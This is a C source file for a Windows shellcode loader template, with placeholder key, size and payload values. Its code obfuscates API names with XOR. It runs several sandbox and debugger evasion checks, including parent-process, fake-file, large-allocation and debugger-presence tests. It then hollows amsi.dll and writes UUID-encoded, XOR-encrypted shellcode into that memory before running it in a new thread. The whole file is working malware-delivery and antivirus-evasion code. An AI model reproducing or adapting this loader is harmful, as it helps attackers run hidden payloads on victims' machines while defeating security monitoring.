
#include <Windows.h>
#include <TlHelp32.h>
#include <Rpc.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <tchar.h>

#pragma comment (lib, "Rpcrt4.lib")

#define KEY "KEY"
#define KEYSIZE sizeof(decKey) - 1
#define SHELLSIZE "SIZE"


typedef LPVOID(WINAPI *VirtualProtectFunc)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef HANDLE(WINAPI *CreateThreadFunc)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef DWORD(WINAPI *WaitForSingleObjectFunc)(HANDLE, DWORD);
typedef BOOL(WINAPI *CheckRemoteDebuggerPresentFunc)(HANDLE, PBOOL);


char cLib1Name[] = "kernel32.dll";
char cLib2Name[] = "amsi.dll";
char cVirtualProtect[] = "VirtualProtect";
char cCreateThread[] = "CreateThread";
char cWaitForSingleObject[] = "WaitForSingleObject";
char cCheckRemoteDebuggerPresentFunc[] = "CheckRemoteDebuggerPresent";

char decKey[] = "DECKEY";

char *uuids[] = "UUIDs";

unsigned char *pShell; 

VirtualProtectFunc pVirtualProtectFunc;
CreateThreadFunc pCreateThreadFunc;
WaitForSingleObjectFunc pWaitForSingleObjectFunc;
CheckRemoteDebuggerPresentFunc pCheckRemoteDebuggerPresentFunc;

BOOL FindProcById(DWORD dwProcId, PROCESSENTRY32 *pe32)
{

    HANDLE hSnapshot;
    BOOL bSuccess = FALSE;

    if ((hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)) != INVALID_HANDLE_VALUE)
    {
        pe32->dwSize = sizeof(PROCESSENTRY32);
        if (Process32First(hSnapshot, pe32)) 
        {
            do {
                if (pe32->th32ProcessID == dwProcId)
                {
                    bSuccess = TRUE;
                    break;
                }
            } while (Process32Next(hSnapshot, pe32));
        }

        CloseHandle(hSnapshot);
    } 

    return bSuccess;
}


void deObfuscateData(char *data)
{
    for (int idx = 0; idx < strlen(data); idx++)
    {
        data[idx] = data[idx] ^ KEY;
    }
    
}

void deObfuscateAll()
{
    deObfuscateData(decKey);
    deObfuscateData(cLib1Name);
    deObfuscateData(cLib2Name);
    deObfuscateData(cVirtualProtect);
    deObfuscateData(cCreateThread);
    deObfuscateData(cWaitForSingleObject);
    deObfuscateData(cCheckRemoteDebuggerPresentFunc);
}

void decShell()
{
    for (int idx = 0, ctr = 0; idx < SHELLSIZE; idx++)
    {
        ctr = (ctr == KEYSIZE) ? 0 : ctr;
        pShell[idx] = pShell[idx] ^ decKey[ctr++];
    }

}

int _tmain(int argc, TCHAR **argv)
{  
    DWORD_PTR pFuncAddr, pShellReader;
    DWORD dwOldProtect = 0;
    HMODULE hModule, hModule2;
    HANDLE hThread;
    BOOL bTrap = FALSE;
    char *pMem;
    int nMemAlloc, nCtr = 0;
    PROCESSENTRY32 pe32;

    if (FindProcById(GetCurrentProcessId(), &pe32))
    {
        _tprintf(TEXT("Current pid = %d, exename = %s\n"), pe32.th32ProcessID, pe32.szExeFile);
        printf("We found the parent proccess id -> %d\n", pe32.th32ParentProcessID);

        if (FindProcById(pe32.th32ParentProcessID, &pe32))
        {
            _tprintf(TEXT("The parent process is %s\n"), pe32.szExeFile);

            /* We expect that will be run from cmd or powershell, else maybe we're inside sandbox */
            if (!(_tcscmp(pe32.szExeFile, TEXT("cmd.exe")) == 0 || _tcscmp(pe32.szExeFile, TEXT("powershell.exe")) == 0))
                return EXIT_FAILURE;
        }
    }

    /* Check for a non-exist file, if found it we're inside sandbox */
    if (CreateFileA(cLib2Name, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_READONLY, NULL) != INVALID_HANDLE_VALUE)
    {
        return EXIT_FAILURE;
    }

    puts("Deobfuscate all (APIs, Libraries, Decryption key)");
    deObfuscateAll();

    /* Load needed libs */
    if (!(
        (hModule = LoadLibraryA((LPCSTR)cLib1Name)) &&
        (hModule2 = LoadLibraryA((LPCSTR)cLib2Name))
    )) {
        return EXIT_FAILURE;
    }

    /* Get the Addresses of the APIs */
    if (!(
        (pVirtualProtectFunc = (VirtualProtectFunc) GetProcAddress(hModule, cVirtualProtect)) &&
        (pCreateThreadFunc = (CreateThreadFunc) GetProcAddress(hModule, cCreateThread)) &&
        (pWaitForSingleObjectFunc = (WaitForSingleObjectFunc) GetProcAddress(hModule, cWaitForSingleObject)) &&
        (pCheckRemoteDebuggerPresentFunc = (CheckRemoteDebuggerPresentFunc) GetProcAddress(hModule, cCheckRemoteDebuggerPresentFunc))
    )) {
        return EXIT_FAILURE;
    }
    
    /* Check if the process under debugger */
    if (!pCheckRemoteDebuggerPresentFunc(GetCurrentProcess(), &bTrap) || bTrap)
    {
        puts("The current process running under debugger");
        return EXIT_FAILURE;
    }

    /* 
        Move key bits to left, let's say the key is 0xfa,
        Will represented as following in memory :
            -> 00000000 00000000 00000000 11111010

        After moving will be :
            -> 00001111 10100000 00000000 00000000

        That's a very large number.
    */
    nMemAlloc = KEY << 20;

    /* Ask os for very large memory, if fail maybe we're inside sandbox */
    if (!(pMem = (char *) malloc(nMemAlloc)))
    {
        return EXIT_FAILURE;
    }

    /* Make large iterations */
    for (int idx = 0; idx < nMemAlloc; idx++)
    {
        /* Count every iteration one by one */
        pMem[nCtr++] = 0x00;
    }
    
    /* If number of iterations and the counter isn't same, we're inside sandbox */
    if (nMemAlloc != nCtr)
    {
        return EXIT_FAILURE;
    }

    /* Deallocate memory */
    free(pMem);

    /* 
        DLL hollowing to bypass memory monitoring.
        Useful resource --> https://www.ired.team/offensive-security/code-injection-process-injection/modulestomping-dll-hollowing-shellcode-injection
        DLL Base Addr + 0x1000 = RWX section.
        We can parse it and obtain the same result.
    */
    pFuncAddr = (DWORD_PTR) hModule2 + 0x1000;

    /* Shell will point to the hollowed address */
    pShell = (unsigned char *) pFuncAddr;

    /* This will read shellcode from UUIDs, and reflect it in the hollowed DLL directly */
    pShellReader = (DWORD_PTR) pShell;

    printf("Shellcode will be written at %p\n", pShell);

    /* Change permission of the section, to overwrite it */
    if (pVirtualProtectFunc((LPVOID)pFuncAddr, SHELLSIZE, PAGE_READWRITE, &dwOldProtect) == 0)
    {
        return EXIT_FAILURE;
    }

    puts("Deobfuscate UUIDs, and obtain encrypted shellcode from it");

    for (int idx = 0; idx < sizeof(uuids) / sizeof(PCHAR); idx++)
    {
        if (UuidFromStringA((RPC_CSTR)uuids[idx], (UUID *)pShellReader) == RPC_S_INVALID_STRING_UUID)
        {
            return EXIT_FAILURE;
        }
        
        /* We have read 16 byte (The size of each UUID), let's move to the next memory space */
        pShellReader += 0x10;
    }

    puts("Decrypt shellcode");
    decShell();
    
    /* Back the old permission */
    if (pVirtualProtectFunc((LPVOID)pFuncAddr, SHELLSIZE, dwOldProtect, &dwOldProtect) == 0)
    {
        return EXIT_FAILURE;
    }

    /* Create a new thread */
    if ((hThread = pCreateThreadFunc(0, 0, (LPTHREAD_START_ROUTINE)pFuncAddr, 0, 0, 0)) == NULL)
    {
        return EXIT_FAILURE;
    }

    pWaitForSingleObjectFunc(hThread, -1);

    return EXIT_SUCCESS;
}